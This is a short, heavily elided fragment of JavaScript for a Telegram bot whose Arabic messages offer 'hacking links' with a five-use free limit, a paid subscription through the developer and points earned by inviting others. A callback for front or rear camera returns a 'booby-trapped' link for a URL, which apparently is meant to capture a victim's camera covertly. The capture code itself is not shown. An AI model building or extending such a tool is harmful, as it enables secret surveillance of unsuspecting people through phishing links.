...
function showButtons(chatId, userId) {
    ...
    const message = isActivated 
        ? 'مرحبا اختار احد الاخيارت الذي تريده ملاحضه لان تستطيع استخدام روابط الاختراق سوى 5 مرات اذا اردت استخدام البوت بدون قيود قوم بتواصل معا المطور لاشتراك ام تريد استخدامه مجاني فقوم بجمع نقاط عبر رابط الدعوه:',
...
bot.on('callback_query', (callbackQuery) => {
    ...
    if (data === 'front_camera' || data === 'rear_camera') {
        ...
        bot.sendMessage(chatId, `تم تلغيم رابط اختراق الموقع: ${url}`)
